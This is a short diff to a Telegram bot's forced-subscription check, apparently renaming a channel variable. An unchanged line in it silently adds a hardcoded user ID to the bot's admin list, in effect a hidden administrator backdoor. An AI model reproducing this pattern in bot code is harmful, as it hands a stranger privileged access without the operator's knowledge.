@@ -38,7 +38,7 @@ async def is_subscribed(bot, query):
     
     ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
     if FSUB_MODE == "REQ":
-        if not REQ_CHANNEL:
+        if not REQUEST_CHANNEL:
             return True
         elif query.from_user.id in ADMINS:
             return True
